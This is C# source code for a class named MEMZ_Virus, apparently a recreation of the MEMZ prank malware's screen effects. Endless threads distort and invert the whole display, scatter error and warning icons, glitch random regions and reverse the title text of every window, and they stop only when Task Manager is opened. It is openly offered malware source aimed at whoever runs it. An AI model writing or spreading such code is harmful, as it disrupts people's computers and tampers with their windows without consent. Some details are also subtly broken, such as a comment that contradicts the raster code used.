using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;

class MEMZ_Virus
{
    [DllImport("gdi32")]
    static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);

    [DllImport("gdi32")]
    static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, string lpInitData);

    [DllImport("gdi32")]
    static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

    [DllImport("user32")]
    static extern int GetSystemMetrics(int smIndex);

    [DllImport("user32")]
    static extern bool GetCursorPos(out POINT lpPoint);

    [DllImport("user32")]
    static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

    [DllImport("user32")]
    static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

    [DllImport("user32")]
    static extern bool EnumChildWindows(IntPtr hwndParent, EnumWindowsProc lpEnumFunc, string lParam);

    [DllImport("user32")]
    static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32")]
    static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);

    [DllImport("user32")]
    static extern IntPtr GetDesktopWindow();

    [DllImport("user32")]
    static extern int GetWindowTextLength(IntPtr hWnd);

    [DllImport("user32")]
    static extern int SetWindowText(IntPtr hWnd, string text);

    static int width = GetSystemMetrics(0);
    static int height = GetSystemMetrics(1);

    delegate bool EnumWindowsProc(IntPtr hWnd, string lParam);

    static bool callback(IntPtr hwnd, string lParam)
    {
        int length = GetWindowTextLength(hwnd);
        StringBuilder lpString = new StringBuilder(length + 1);
        GetWindowText(hwnd, lpString, lpString.Capacity);
        string text = lpString.ToString();
        List<char> charArray = text.ToCharArray().ToList();
        charArray.Reverse();
        string newText = string.Join("", charArray.ToArray());
        SendMessage(hwnd, 12, IntPtr.Zero, newText);
        return true;
    }

    static void Tunnel()
    {
        do
        {
            IntPtr hDC = CreateDC("DISPLAY", null, null, null);
            StretchBlt(hDC, 50, 50, width - 100, height - 100, hDC, 0, 0, width, height, 0x00CC0020); // SRCCOPY
        } while (true);
    }

    static void Errors()
    {
        int ix = GetSystemMetrics(11) / 2;
        int iy = GetSystemMetrics(12) / 2;
        do
        {
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            GetCursorPos(out POINT cursor);
            IntPtr icon = LoadIcon(IntPtr.Zero, 32513);
            DrawIcon(hdc, cursor.x - ix, cursor.y - iy, icon);
        } while (true);
    }

    static void Warnings()
    {
        do
        {
            Random random = new Random();
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            IntPtr icon = LoadIcon(IntPtr.Zero, 32515);
            DrawIcon(hdc, random.Next(0, width), random.Next(0, height), icon);
        } while (true);
    }

    static void Invert()
    {
        do
        {
            Thread.Sleep(1000);
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, 0x00330008); // NOTSRCCOPY
        } while (true);
    }

    static void Reverse()
    {
        do
        {
            Thread.Sleep(1000);
            EnumChildWindows(GetDesktopWindow(), callback, null);
        } while (true);
    }

    static void Glitch()
    {
        do
        {
            Thread.Sleep(500);
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            Random random = new Random();
            int x1 = random.Next(0, width);
            int y1 = random.Next(0, height);
            int x2 = random.Next(0, width);
            int y2 = random.Next(0, height);
            int w = random.Next(0, width);
            int h = random.Next(0, height);
            BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, 0x00CC0020); // SRCINVERT: 0x00660046
        } while (true);
    }

    static Thread[] threads =
    {
        new Thread(Tunnel),
        new Thread(Errors),
        new Thread(Warnings),
        new Thread(Invert),
        new Thread(Reverse),
        new Thread(Glitch)
    };

    static void Main(string[] args)
    {
        foreach (Thread thread in threads)
        {
            thread.Start();
        }

        do
        {
            Process[] processes = Process.GetProcessesByName("taskmgr");
            if (processes.Length != 0)
            {
                foreach (Thread thread in threads)
                {
                    thread.Abort();
                }
                break;
            }
        } while (true);
    }

    struct POINT
    {
        public int x;
        public int y;
    }
}